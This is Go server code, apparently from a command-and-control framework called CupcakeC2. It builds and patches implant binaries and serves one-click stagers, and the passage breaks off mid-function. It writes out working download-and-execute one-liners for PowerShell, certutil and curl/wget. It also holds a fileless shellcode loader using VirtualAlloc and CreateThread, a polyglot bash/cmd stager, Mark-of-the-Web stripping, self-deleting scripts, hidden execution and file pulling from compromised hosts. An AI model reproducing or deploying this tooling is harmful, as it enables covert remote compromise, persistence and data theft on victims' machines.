package controllers

import (
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/hub"
	"cupcake-server/pkg/paths"
	"cupcake-server/pkg/stagerguard"
	"cupcake-server/pkg/utils"
	"cupcake-server/services"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
)

const stagerCacheTTL = 10 * time.Minute

type stagerCacheEntry struct {
	cfg       StagerConfig
	expiresAt time.Time
}

var StagerCache = sync.Map{}

// stagerHits limits downloads per cache id (default 5; CUPCAKE_STAGER_MAX_HITS).
var stagerHits = stagerguard.NewHitCounter(stagerguard.MaxHitsFromEnv())

func init() {
	go func() {
		t := time.NewTicker(2 * time.Minute)
		defer t.Stop()
		for range t.C {
			now := time.Now()
			StagerCache.Range(func(k, v interface{}) bool {
				if e, ok := v.(stagerCacheEntry); ok && now.After(e.expiresAt) {
					StagerCache.Delete(k)
					if id, ok := k.(string); ok {
						stagerHits.Delete(id)
					}
				}
				return true
			})
		}
	}()
}

type StagerConfig struct {
	OS           string
	Arch         string
	ListenerID   string
	Host         string // Agent C2 callback host (NOT the panel download host)
	AutoDestruct bool
	SleepTime    int
	Profile      string // reverse | forward (direction); cargo always minimal
	Extra        string // For bat stager: "url64|url32"
	// Delivery: ""|"disk" (default EXE) | "fileless" (stage2 PIC via Donut)
	Delivery string
	// Stage2ID when Delivery=fileless
	Stage2ID string
}

func stagerCacheStore(id string, cfg StagerConfig) {
	stagerHits.Reset(id)
	StagerCache.Store(id, stagerCacheEntry{cfg: cfg, expiresAt: time.Now().Add(stagerCacheTTL)})
}

func stagerCacheLoad(id string) (StagerConfig, bool) {
	v, ok := StagerCache.Load(id)
	if !ok {
		return StagerConfig{}, false
	}
	e, ok := v.(stagerCacheEntry)
	if !ok {
		return StagerConfig{}, false
	}
	if time.Now().After(e.expiresAt) {
		StagerCache.Delete(id)
		stagerHits.Delete(id)
		return StagerConfig{}, false
	}
	return e.cfg, true
}

// stagerCacheConsume loads a cache entry and records one download hit.
// status is one of: ok, not_found, expired, max_hits (for audit).
func stagerCacheConsume(id string) (cfg StagerConfig, status string, ok bool) {
	v, found := StagerCache.Load(id)
	if !found {
		return StagerConfig{}, stagerguard.StatusNotFound, false
	}
	e, castOK := v.(stagerCacheEntry)
	if !castOK {
		return StagerConfig{}, stagerguard.StatusNotFound, false
	}
	if time.Now().After(e.expiresAt) {
		StagerCache.Delete(id)
		stagerHits.Delete(id)
		return StagerConfig{}, stagerguard.StatusExpired, false
	}
	if !stagerHits.Try(id) {
		StagerCache.Delete(id)
		stagerHits.Delete(id)
		return StagerConfig{}, stagerguard.StatusMaxHits, false
	}
	return e.cfg, stagerguard.StatusOK, true
}

func stagerAudit(c *gin.Context, id, status string) {
	stagerguard.Audit(c.ClientIP(), c.Request.URL.Path, id, status)
}

// Build log WS is browser-only — use AdminCheckOrigin (empty Origin rejected).
var upgrader_gen = websocket.Upgrader{
	CheckOrigin: globals.AdminCheckOrigin,
}

// Product client types (UI / API "profile" field) — connection direction only:
//
//	reverse | … → 反向连接（Agent 主动回连）
//	forward | … → 正向 bind（Agent 监听，面板接入）
//
// Cargo feature tier is always **minimal** (sole product aggregate).
// Legacy names beacon/standard/full map to reverse direction only.
func normalizeCapabilityProfile(p string) string {
	switch strings.ToLower(strings.TrimSpace(p)) {
	case "forward", "bind", "bind-tcp", "正向", "正向客户端":
		return "forward"
	case "beacon", "reverse", "reverse_slim", "slim", "small", "minimal",
		"standard", "legacy-standard", "full",
		"反向", "反向客户端", "小体积反向":
		return "reverse"
	default:
		return "reverse"
	}
}

// cargoProfile always returns the sole product cargo tier.
func cargoProfile(product string) string {
	_ = product
	return "minimal"
}

// profileBuildHint returns operator-facing notes for logs / errors.
func profileBuildHint(profile string) string {
	const caps = "唯一产品档 minimal：终端/文件/进程/socks 内置；BOF/.NET/inject 按需 L2"
	switch normalizeCapabilityProfile(profile) {
	case "forward":
		return "正向客户端：Agent 监听 bind 端口，面板主动接入。" + caps
	default:
		return "反向客户端：Agent 主动回连监听器。" + caps
	}
}

// isBindProtocol reports whether listener protocol is reverse-bind (forward client).
func isBindProtocol(proto string) bool {
	p := strings.ToUpper(strings.TrimSpace(proto))
	return p == "BIND-TCP" || p == "正向TCP" || strings.Contains(p, "BIND")
}

// validateClientTypeVsListener ensures product direction matches listener.
// reverse → reverse protocols; forward → bind only.
func validateClientTypeVsListener(product, listenerProto string) error {
	product = normalizeCapabilityProfile(product)
	bind := isBindProtocol(listenerProto)
	switch product {
	case "reverse":
		if bind {
			return fmt.Errorf("「反向客户端」请选择 TCP/WebSocket/DNS 等反向监听器，勿使用正向TCP")
		}
	case "forward":
		if !bind {
			return fmt.Errorf("「正向客户端」必须选择 正向TCP / Bind-TCP 监听器")
		}
	}
	return nil
}

func profileProductLabel(product string) string {
	switch normalizeCapabilityProfile(product) {
	case "forward":
		return "正向客户端"
	default:
		return "反向客户端"
	}
}

// resolvePatchTemplate picks a prebuilt template path for patch mode.
// All templates are cargo **minimal**. `profile` is direction only (reverse/forward) and
// does not select a capability tier. Legacy `*_minimal` names remain as optional aliases
// (caller may try them if primary file is missing).
func resolvePatchTemplate(osType, arch, protocol, _profile string) (string, string) {
	proto := strings.ToUpper(strings.TrimSpace(protocol))
	isWin := strings.EqualFold(osType, "windows")
	isArm := strings.Contains(strings.ToLower(arch), "arm64")
	archL := strings.ToLower(arch)
	isX86 := strings.Contains(archL, "i386") ||
		(strings.Contains(archL, "x86") && !strings.Contains(archL, "x64") && !strings.Contains(archL, "amd64"))

	if isWin {
		switch proto {
		case "WS", "WEBSOCKET", "WSS":
			if isX86 {
				return "client_template_windows_x86.exe", ""
			}
			return "client_template_windows.exe", ""
		case "TCP":
			return "client_template_windows_tcp.exe", ""
		case "BIND-TCP", "正向TCP":
			return "client_template_windows_bind.exe", ""
		case "DNS":
			return "client_template_windows_dns.exe", ""
		default:
			return "client_template_windows.exe", ""
		}
	}

	// linux
	name := "client_template_linux"
	switch proto {
	case "WS", "WEBSOCKET", "WSS":
		name = "client_template_linux"
	case "TCP":
		name = "client_template_linux_tcp"
	case "BIND-TCP", "正向TCP":
		name = "client_template_linux_bind"
	case "DNS":
		name = "client_template_linux_dns"
	default:
		name = "client_template_linux"
	}
	if isArm {
		name += "_arm64"
	}
	return name, ""
}

// resolvePatchTemplateAlias returns a legacy *_minimal filename for the same protocol (if any).
func resolvePatchTemplateAlias(osType, arch, protocol string) string {
	proto := strings.ToUpper(strings.TrimSpace(protocol))
	isWin := strings.EqualFold(osType, "windows")
	isArm := strings.Contains(strings.ToLower(arch), "arm64")
	if isWin && proto == "TCP" {
		return "client_template_windows_tcp_minimal.exe"
	}
	if !isWin && proto == "TCP" {
		if isArm {
			return "client_template_linux_tcp_minimal_arm64"
		}
		return "client_template_linux_tcp_minimal"
	}
	return ""
}

func HandleGenerate(c *gin.Context) {
	var req struct {
		OS              string `json:"os"`
		Arch            string `json:"arch"`
		ListenerID      string `json:"listener_id"`
		Host            string `json:"host"`
		Method          string `json:"method"`
		AutoDestruct    bool   `json:"auto_destruct"`
		SleepTime       int    `json:"sleep_time"`
		AesKey          string `json:"aes_key"`
		UseUPX          bool   `json:"use_upx"`
		EncryptionSalt  string `json:"encryption_salt"`
		ObfuscationMode string `json:"obfuscation_mode"`
		Jitter          int    `json:"jitter"`
		Profile         string `json:"profile"` // reverse | forward (direction only; cargo always minimal)
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "Invalid input"})
		return
	}

	// 1. Fetch Listener Details
	val, ok := globals.Listeners.Load(req.ListenerID)
	if !ok {
		c.JSON(404, gin.H{"error": "监听器未在线或不存在"})
		return
	}
	ln := val.(*globals.Listener)

	req.EncryptionSalt = ln.EncryptionSalt
	req.ObfuscationMode = ln.ObfuscateMode
	req.AesKey = ln.EncryptKey
	if req.Jitter == 0 {
		req.Jitter = ln.HeartbeatJitter
	}
	if req.Jitter == 0 {
		req.Jitter = 30 // Default 30%
	}
	product := normalizeCapabilityProfile(req.Profile)
	if err := validateClientTypeVsListener(product, ln.Protocol); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error(), "hint": profileBuildHint(product)})
		return
	}
	// Cargo feature tier always minimal; reverse/forward only changes protocol direction.
	profile := cargoProfile(product)

	// --- [NEW] Method Dispatcher ---
	
	// Mode A: Binary Patch (Synchronous, fast)
	if req.Method == "patch" {
		// reverse uses minimal cargo; patch uses prebuilt minimal templates
		templateName, hint := resolvePatchTemplate(req.OS, req.Arch, ln.Protocol, profile)
		if templateName == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": hint})
			return
		}
		templatePath := filepath.Join("assets", templateName)
		raw, err := os.ReadFile(templatePath)
		if err != nil {
			msg := "未找到预编译模板 (" + templateName + ")，请确保已编译模板或切换到源码模式"
			c.JSON(http.StatusInternalServerError, gin.H{"error": msg})
			return
		}

		// Prepare C2 URL with correct scheme
		c2url := ""
		host := req.Host
		if host == "" {
			host = "127.0.0.1"
		}

		switch strings.ToUpper(ln.Protocol) {
		case "WS":
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		case "TCP":
			c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
		case "BIND-TCP", "正向TCP":
			// Bind 模式下，Agent 将在受害机监听指定端口
			c2url = fmt.Sprintf("bind://0.0.0.0:%d", ln.Port)
		case "DNS":
			c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
		default:
			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
		}

		patched, err := services.PatchPayload(raw, c2url, req.AesKey, ln.HeartbeatInterval, req.Jitter, "", req.AutoDestruct, req.SleepTime, req.EncryptionSalt, req.ObfuscationMode)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": "补丁失败: " + err.Error()})
			return
		}

		randSuffix, _ := utils.RandomAlphaString(8)
		filename := randSuffix
		if req.OS == "windows" {
			filename += ".exe"
		}

		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filename))
		c.Data(http.StatusOK, "application/octet-stream", patched)
		return
	}

	// Mode B: Source Build (Asynchronous, supports cross-compilation/custom features)
	taskID := uuid.New().String()

	host := req.Host
	if host == "" {
		host = "127.0.0.1"
	}
	if strings.ToUpper(ln.Protocol) == "DNS" {
		host = ln.NSDomain
	}

	conf := services.PayloadConfig{
		OSType:            req.OS,
		Arch:              req.Arch,
		Protocol:          ln.Protocol,
		Host:              host,
		Port:              fmt.Sprintf("%d", ln.Port),
		AESKey:            req.AesKey,
		AutoDestruct:      req.AutoDestruct,
		SleepTime:         req.SleepTime,
		UseUPX:            req.UseUPX,
		HeartbeatInterval: ln.HeartbeatInterval,
		EncryptionSalt:    req.EncryptionSalt,
		ObfuscationMode:   req.ObfuscationMode,
		Jitter:            req.Jitter,
		Profile:           profile,
	}

	go func() {
		logChan := make(chan string, 100)
		hub.BuildHub.Broadcast(taskID, hub.WsPacket{
			MsgType: "log",
			Content: fmt.Sprintf("[*] 构建引擎已就绪 | 类型=%s | cargo=%s | upx=%v",
				profileProductLabel(product), profile, req.UseUPX),
			TaskID:  taskID,
		})
		hub.BuildHub.Broadcast(taskID, hub.WsPacket{
			MsgType: "log",
			Content: "[*] " + profileBuildHint(product),
			TaskID:  taskID,
		})
		if req.UseUPX {
			hub.BuildHub.Broadcast(taskID, hub.WsPacket{
				MsgType: "log",
				Content: "[!] 警告: 已启用 UPX，现代 AV 对 UPX 特征敏感，生产环境不推荐",
				TaskID:  taskID,
			})
		}
		go func() {
			for line := range logChan {
				hub.BuildHub.Broadcast(taskID, hub.WsPacket{
					MsgType: "log",
					Content: line,
					TaskID:  taskID,
				})
			}
		}()

		artifactPath, err := services.BuildAgentWithLogger(conf, logChan)
		if err != nil {
			hub.BuildHub.Broadcast(taskID, hub.WsPacket{
				MsgType: "error",
				Content: err.Error(),
				TaskID:  taskID,
			})
		} else {
			filename := filepath.Base(artifactPath)
			downloadURL := "/api/payloads/" + filename
			hub.BuildHub.Broadcast(taskID, hub.WsPacket{
				MsgType: "success",
				Content: downloadURL,
				TaskID:  taskID,
			})
		}
		close(logChan)
	}()

	c.JSON(http.StatusOK, gin.H{
		"status":  "success",
		"task_id": taskID,
		"msg":     "构建任务已启动",
	})
}

func HandleGenerateStream(c *gin.Context) {
	c.JSON(400, gin.H{"error": "Please use POST /api/generate"})
}

func HandleBuildLogsWS(c *gin.Context) {
	taskID := c.Param("task_id")
	ws, err := upgrader_gen.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		return
	}
	defer ws.Close()

	logChan := hub.BuildHub.Subscribe(taskID)
	defer hub.BuildHub.Unsubscribe(taskID, logChan)

	for packet := range logChan {
		if err := ws.WriteJSON(packet); err != nil {
			break
		}
	}
}

func HandleFsDownload(c *gin.Context) {
	uuid := c.Query("uuid")
	path := c.Query("path")

	if uuid == "" || path == "" {
		var req struct {
			UUID string `json:"uuid"`
			Path string `json:"path"`
		}
		if err := c.ShouldBindJSON(&req); err == nil {
			if uuid == "" {
				uuid = req.UUID
			}
			if path == "" {
				path = req.Path
			}
		}
	}

	if uuid == "" || path == "" {
		c.JSON(400, gin.H{"error": "uuid and path are required"})
		return
	}

	body, size, err := services.OpenDownloadViaYamux(uuid, path)
	if err != nil {
		if errors.Is(err, services.ErrYamuxRequired) {
			// ⚡ FALLBACK: WebSocket / DNS agents have no Yamux session — stream the
			// file over the control-plane command channel (base64 chunks).
			log.Printf("[download] yamux unavailable for agent=%s, using control-plane chunk fallback path=%s", uuid, path)
			downloadViaControlPlane(c, uuid, path)
			return
		}
		if errors.Is(err, services.ErrAgentOffline) || strings.Contains(strings.ToLower(err.Error()), "offline") {
			c.JSON(http.StatusNotFound, gin.H{"error": "agent offline", "code": "offline"})
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	defer body.Close()

	filename := filepath.Base(path)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
	c.Header("Content-Type", "application/octet-stream")
	c.Header("Content-Length", fmt.Sprintf("%d", size))
	c.Status(http.StatusOK)

	if _, err := io.Copy(c.Writer, body); err != nil {
		// Headers already sent; cannot switch to JSON.
		return
	}
}

// downloadViaControlPlane streams a remote file to the panel as base64 chunks
// over the command channel (WS/DNS fallback; no Yamux session needed).
func downloadViaControlPlane(c *gin.Context, uuid, path string) {
	filename := filepath.Base(path)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
	c.Header("Content-Type", "application/octet-stream")
	c.Status(http.StatusOK)

	const chunkSize = 2 * 1024 * 1024 // 2 MiB raw → ~2.7 MiB base64 per round-trip
	var offset uint64
	contentLengthSet := false

	for {
		raw, isEOF, total, err := services.DownloadChunk(uuid, path, offset, chunkSize)
		if err != nil {
			log.Printf("[download] FAIL agent=%s path=%s offset=%d: %v", uuid, path, offset, err)
			return
		}
		if !contentLengthSet && total > 0 {
			c.Header("Content-Length", fmt.Sprintf("%d", total))
			contentLengthSet = true
		}
		if len(raw) > 0 {
			if _, werr := c.Writer.Write(raw); werr != nil {
				return
			}
			offset += uint64(len(raw))
		}
		if isEOF || len(raw) == 0 {
			return
		}
	}
}

func HandleGetStager(c *gin.Context) {
	listenerID := c.Query("listener_id")
	osType := strings.ToLower(strings.TrimSpace(c.Query("os"))) // windows, linux
	arch := strings.ToLower(strings.TrimSpace(c.Query("arch"))) // x64, amd64, arm64, x86...
	// host = Agent 回连地址（写入 payload），绝不能当作面板下载域名
	callbackHost := strings.TrimSpace(c.Query("host"))
	product := normalizeCapabilityProfile(c.Query("profile"))
	// delivery: disk (default) | fileless
	delivery := strings.ToLower(strings.TrimSpace(c.Query("delivery")))
	if delivery == "" {
		delivery = "disk"
	}
	if delivery != "disk" && delivery != "fileless" {
		c.JSON(400, gin.H{"error": "delivery must be disk or fileless"})
		return
	}

	if listenerID == "" || osType == "" {
		c.JSON(400, gin.H{"error": "listener_id and os are required"})
		return
	}

	// 校验监听器存在
	lnVal, ok := globals.Listeners.Load(listenerID)
	if !ok {
		c.JSON(404, gin.H{"error": "监听器未在线或不存在"})
		return
	}
	lnCheck := lnVal.(*globals.Listener)
	if err := validateClientTypeVsListener(product, lnCheck.Protocol); err != nil {
		c.JSON(400, gin.H{"error": err.Error(), "hint": profileBuildHint(product)})
		return
	}
	// 一键上线走补丁模板（均为 minimal 产品档模板）
	profile := cargoProfile(product)

	// 下载地址必须指向 Web 控制台（面板），携带端口；与 C2 回连 host 分离
	// 例：面板 http://1.2.3.4:9999 ，回连 tcp://1.2.3.4:8888
	downloadHost := c.Request.Host
	if xfh := c.GetHeader("X-Forwarded-Host"); xfh != "" {
		downloadHost = strings.Split(xfh, ",")[0]
		downloadHost = strings.TrimSpace(downloadHost)
	}
	httpProto := "http"
	if c.Request.TLS != nil || strings.EqualFold(c.GetHeader("X-Forwarded-Proto"), "https") {
		httpProto = "https"
	}

	if callbackHost == "" {
		// 默认用面板主机名（去掉端口）作为回连 IP 提示
		callbackHost = strings.Split(downloadHost, ":")[0]
	}

	// 规范化 arch
	switch {
	case strings.Contains(arch, "arm64"):
		arch = "arm64"
	case strings.Contains(arch, "i386"), arch == "x86":
		arch = "x86"
	default:
		arch = "x64"
	}

	newID := func() string {
		// 8 hex chars — 旧逻辑只用 3 位极易碰撞
		return strings.ReplaceAll(uuid.New().String(), "-", "")[:8]
	}

	if osType == "windows" && delivery == "fileless" {
		// Fileless: patch Stage0 PE → Donut PIC → cache as stage2; return fetch URL + PS loader
		// Note: arch for Donut — map UI amd64 → x64
		donutArch := "x64"
		if arch == "x86" {
			donutArch = "x86"
		}
		stage2ID, stage2URL, stage2Len, ferr := buildAndCacheFilelessStage2(
			c, listenerID, callbackHost, donutArch, profile, httpProto, downloadHost,
		)
		if ferr != nil {
			c.JSON(500, gin.H{
				"error":    "fileless stage2: " + ferr.Error(),
				"delivery": "fileless",
				"hint":     "确认 assets/ 下存在 client_template_* 且监听器在线；杀软可能拦截 Donut 打包过程",
			})
			return
		}
		// Short one-liner: iex(iwr loader) — loader body served at /api/s/l/:id
		loaderURL := fmt.Sprintf("%s://%s/api/s/l/%s", httpProto, downloadHost, stage2ID)
		psCommand := buildFilelessIEXCommand(loaderURL)
		psInlineCommand := buildFilelessPSCommand(stage2URL) // 不走外链的内联回退
		stagerCmd := buildFilelessStagerCommand(stage2URL)
		expiresAt := time.Now().Add(10 * time.Minute).UTC().Format(time.RFC3339)
		c.JSON(200, gin.H{
			"id":                stage2ID,
			"delivery":          "fileless",
			"delivery_label":    "内存上线",
			"command":           psCommand, // 默认推荐：最短 IEX 外链
			"command_ps":        psCommand,
			"command_ps_inline": psInlineCommand,
			"command_stager":    stagerCmd,
			"command_primary":   "ps",
			"download":          stage2URL,
			"loader_url":        loaderURL,
			"stage2_url":        stage2URL,
			"stage2_bytes":       stage2Len,
			"stage2_ttl_sec":    600,
			"expires_at":         expiresAt,
			"callback":           callbackHost,
			"profile":            product,
			"profile_label":      profileProductLabel(product) + " · 内存上线",
			"panel_host":         downloadHost,
			"arch":               donutArch,
			"recommended":       "command_ps",
			"notes": []string{
				"推荐复制「PowerShell」：iex(iwr loader) 一行执行，loader 由面板临时下发（约 10 分钟有效）。",
				"「内联」是把 P/Invoke 整段塞进命令体，不依赖 loader 路由，命令最长但无二次请求。",
				"Stage2 URL 约 10 分钟有效，过期请点刷新重新生成。",
				"cupcake-stager 需事先放到目标目录；签名更响，仅实验室。",
				"内存上线 ≠ BOF；上线后的 BOF 走 bof 模块（进程内执行）。",
			},
		})
		return
	}

	// Linux has no fileless PIC path yet
	if delivery == "fileless" && osType != "windows" {
		c.JSON(400, gin.H{
			"error":    "fileless 目前仅支持 Windows",
			"delivery": "fileless",
			"hint":     "Linux 请使用 delivery=disk",
		})
		return
	}

	if osType == "windows" {
		id64 := newID()
		id32 := newID()
		stagerCacheStore(id64, StagerConfig{
			OS: "windows", Arch: "x64", ListenerID: listenerID, Host: callbackHost,
			AutoDestruct: true, SleepTime: 0, Profile: profile, Delivery: "disk",
		})
		stagerCacheStore(id32, StagerConfig{
			OS: "windows", Arch: "x86", ListenerID: listenerID, Host: callbackHost,
			AutoDestruct: true, SleepTime: 0, Profile: profile, Delivery: "disk",
		})

		url64 := fmt.Sprintf("%s://%s/api/s/bin/%s", httpProto, downloadHost, id64)
		url32 := fmt.Sprintf("%s://%s/api/s/bin/%s", httpProto, downloadHost, id32)

		batID := fmt.Sprintf("w_%s_%s", id64, id32)
		stagerCacheStore(batID, StagerConfig{
			OS: "windows_bat", Arch: "auto", ListenerID: listenerID, Host: callbackHost,
			AutoDestruct: true, SleepTime: 0, Profile: profile, Delivery: "disk",
			Extra: fmt.Sprintf("%s|%s", url64, url32),
		})

		batURL := fmt.Sprintf("%s://%s/api/s/%s", httpProto, downloadHost, batID)
		// 推荐：PS 直拉 x64 EXE（最短）；CMD/bat 为 certutil 被禁/32 位环境的备选
		psCommand := buildDiskPSCommand(url64) // 默认推荐 x64 直链
		cmdCommand := buildDiskCmdCommand(batURL)
		psBatCommand := buildDiskPSBatCommand(batURL)

		c.JSON(200, gin.H{
			"id":              batID,
			"delivery":        "disk",
			"delivery_label":  "落盘 EXE",
			"command":         psCommand, // 默认推荐：PS 直拉 x64 最短路径
			"command_cmd":     cmdCommand,
			"command_ps":      psCommand,
			"command_ps_bat":  psBatCommand,
			"command_primary": "ps",
			"download":        batURL,
			"download_x64":    url64,
			"download_x86":    url32,
			"callback":        callbackHost,
			"profile":         product,
			"profile_label":   profileProductLabel(product),
			"panel_host":      downloadHost,
			"recommended":     "command_ps",
			"notes": []string{
				"推荐复制「PS 直拉」：WebClient 拉 x64 EXE → 隐藏启动，命令最短。",
				"「CMD」用 certutil 拉 bat 自动分 x64/x86，兼容 32 位目标。",
				"「PS+bat」与 CMD 等价，适合禁用 certutil 的环境（拉 bat + 调用）。",
			},
		})
		return
	}

	// Linux
	if arch == "" {
		arch = "x64"
	}
	id := newID()
	stagerCacheStore(id, StagerConfig{
		OS: "linux", Arch: arch, ListenerID: listenerID, Host: callbackHost,
		AutoDestruct: true, SleepTime: 0, Profile: profile,
	})
	baseURL := fmt.Sprintf("%s://%s/api/s/%s", httpProto, downloadHost, id)
	// 拉二进制并后台执行；用 /api/s/bin 更稳（纯 bin，不依赖 polyglot）
	binURL := fmt.Sprintf("%s://%s/api/s/bin/%s", httpProto, downloadHost, id)
	command := buildLinuxDiskCommand(binURL)

	c.JSON(200, gin.H{
		"id":             id,
		"delivery":       "disk",
		"delivery_label": "落盘 ELF",
		"command":        command,
		"command_cmd":    command,
		"download":       baseURL,
		"binary":         binURL,
		"callback":       callbackHost,
		"profile":        product,
		"profile_label":  profileProductLabel(product),
		"panel_host":     downloadHost,
		"recommended":    "command",
		"notes": []string{
			"curl/wget 下载到 /tmp 随机名 → 后台执行 → 删除文件（进程仍在跑）。",
		},
	})
}

// --- one-click stager command builders (keep short, copy-paste friendly) ---

func buildDiskCmdCommand(batURL string) string {
	// 单行：certutil 拉 bat → call → 删 bat（bat 内再拉 EXE 并自删）
	return fmt.Sprintf(
		`cmd /c "set B=%%TEMP%%\u%%RANDOM%%.bat&certutil -urlcache -split -f "%s" %%B%% >nul 2>&1&call %%B%%&del /f /q %%B%% >nul 2>&1"`,
		batURL,
	)
}

func buildDiskPSCommand(exeURL string) string {
	// 直拉 x64 EXE，最短路径（推荐 64 位目标）；固定名 u.exe 覆盖即可，一次性 stager
	return fmt.Sprintf(
		`powershell -nop -w h -c "$p=\"$env:TEMP\u.exe\";(New-Object Net.WebClient).DownloadFile('%s',$p);Start-Process -FilePath $p -WindowStyle Hidden"`,
		exeURL,
	)
}

func buildDiskPSBatCommand(batURL string) string {
	return fmt.Sprintf(
		`powershell -nop -w h -c "$p=Join-Path $env:TEMP ('u'+[guid]::NewGuid().ToString('n').Substring(0,8)+'.bat');(New-Object Net.WebClient).DownloadFile('%s',$p);& $p;Remove-Item $p -Force -EA 0"`,
		batURL,
	)
}

func buildLinuxDiskCommand(binURL string) string {
	return fmt.Sprintf(
		`f=/tmp/.u$RANDOM$RANDOM; (curl -fsSL -m180 '%s' -o "$f"||wget -T180 -q '%s' -O "$f")&&chmod +x "$f"&&(nohup "$f" >/dev/null 2>&1 &)& sleep 1; rm -f "$f"`,
		binURL, binURL,
	)
}

// buildFilelessPSCommand: true in-memory (DownloadData → VirtualAlloc → CreateThread), no stage2 on disk.
// Inline version kept as a fallback for environments that cannot fetch the /api/s/l loader script.
func buildFilelessPSCommand(stage2URL string) string {
	// Compact single-line; WebClient.DownloadData avoids temp shellcode file.
	return fmt.Sprintf(
		`powershell -nop -w h -c "$b=(New-Object Net.WebClient).DownloadData('%s');$c=Add-Type -MemberDefinition '[DllImport(\"kernel32\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport(\"kernel32\")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);[DllImport(\"kernel32\")]public static extern uint WaitForSingleObject(IntPtr h,uint m);' -Name W -PassThru;$m=$c::VirtualAlloc(0,$b.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);$c::WaitForSingleObject($c::CreateThread(0,0,$m,0,0,0),0xFFFFFFFF)"`,
		stage2URL,
	)
}

// buildFilelessIEXCommand is the short one-liner: fetch the loader PS body from
// /api/s/l/:id via iwr and iex it in-memory. The loader body is the same
// VirtualAlloc/CreateThread P/Invoke as buildFilelessPSCommand.
func buildFilelessIEXCommand(loaderURL string) string {
	return fmt.Sprintf(`powershell -nop -w h -c "iex(iwr -UseBasicParsing '%s')"`, loaderURL)
}

func buildFilelessStagerCommand(stage2URL string) string {
	return fmt.Sprintf(`set "CUPCAKE_STAGE2_URL=%s" && cupcake-stager.exe`, stage2URL)
}

func HandleServePayload(c *gin.Context) {
	id := c.Param("id")
	conf, status, ok := stagerCacheConsume(id)
	if !ok {
		stagerAudit(c, id, status)
		c.Data(404, "text/plain", []byte("Not found"))
		return
	}
	stagerAudit(c, id, stagerguard.StatusOK)

	// 🚀 Windows BAT stager: returns a script that auto-detects x64/x86
	if conf.OS == "windows_bat" {
		parts := strings.Split(conf.Extra, "|")
		if len(parts) != 2 {
			c.Data(500, "text/plain", []byte("Invalid bat config"))
			return
		}
		url64 := parts[0]
		url32 := parts[1]

		// Note: in bat files, %TEMP% is correct; when we fmt.Sprintf we must escape % as %%
		// Zone.Identifier strip reduces MotW SmartScreen prompts for downloaded binaries (not a bypass of signatures).
		// Neutral names; strip MotW; self-delete bat
		bat := fmt.Sprintf(`@echo off
set "OUT=%%LOCALAPPDATA%%\Microsoft\Windows\INetCache\~DF%%RANDOM%%%%RANDOM%%.tmp"
if /I "%%PROCESSOR_ARCHITECTURE%%"=="AMD64" (certutil -urlcache -split -f "%s" "%%OUT%%" >nul 2>&1) else if /I "%%PROCESSOR_ARCHITEW6432%%"=="AMD64" (certutil -urlcache -split -f "%s" "%%OUT%%" >nul 2>&1) else (certutil -urlcache -split -f "%s" "%%OUT%%" >nul 2>&1)
if exist "%%OUT%%" (del /f /q "%%OUT%%:Zone.Identifier" >nul 2>&1 & start "" /b "%%OUT%%")
del /f /q "%%~f0" >nul 2>&1
`, url64, url64, url32)

		c.Header("Content-Disposition", "attachment; filename=c2s.bat")
		c.Data(200, "application/octet-stream", []byte(bat))
		return
	}

	// Build the binary download URL from the current request
	protocol := "http"
	if c.Request.TLS != nil {
		protocol = "https"
	}
	binaryURL := fmt.Sprintf("%s://%s/api/s/bin/%s", protocol, c.Request.Host, id)

	// Craft a polyglot script: works in both bash/sh and Windows cmd.exe.
	// The first line is a valid trick:
	//   - In bash: '#" starts a comment → entire line ignored
	//   - In cmd.exe: '#!' is not a command → error hidden by '2>nul',
	//     then '@echo off & goto :BAT_START' jumps past the bash section
	script := fmt.Sprintf(`#!/bin/sh 2>nul & @echo off & goto :BAT_START

# [CupcakeC2] Universal Stager — self-detects bash vs cmd.exe
# Binary download URL (embedded at build time):
#   %s

# ---- BASH / POSIX SHELL -------------------------------------------------
if command -v curl >/dev/null 2>&1; then
    curl -fsSL -m300 "%s" -o /tmp/.cupcake 2>/dev/null
elif command -v wget >/dev/null 2>&1; then
    wget -T300 -q "%s" -O /tmp/.cupcake 2>/dev/null
fi
if [ -f /tmp/.cupcake ] && [ -s /tmp/.cupcake ]; then
    chmod +x /tmp/.cupcake 2>/dev/null
    nohup /tmp/.cupcake >/dev/null 2>&1 &
    sleep 1 2>/dev/null
    rm -f /tmp/.cupcake 2>/dev/null
fi
exit 0

# ---- WINDOWS CMD.EXE ----------------------------------------------------
:BAT_START
@echo off
certutil.exe -urlcache -split -f "%s" %%TEMP%%\svc.exe >nul 2>&1
if exist %%TEMP%%\svc.exe (
    start /b %%TEMP%%\svc.exe
    del /f /q "%%~f0" >nul 2>&1
)
exit /b 0
`, binaryURL, binaryURL, binaryURL, binaryURL)

	c.Data(200, "application/octet-stream", []byte(script))
}

// HandleServeRawPayload serves the raw patched binary (no script wrapping).
// Used internally by the polyglot script at /api/s/:id and by the
// Windows BAT stager at /api/s/bin/:id.
func HandleServeRawPayload(c *gin.Context) {
	id := c.Param("id")
	conf, status, ok := stagerCacheConsume(id)
	if !ok {
		stagerAudit(c, id, status)
		c.Data(404, "text/plain", []byte("stager id expired or unknown — regenerate one-click command in the panel"))
		return
	}
	stagerAudit(c, id, stagerguard.StatusOK)

	// Auto-detect target OS from User-Agent if set to "auto"
	targetOS := conf.OS
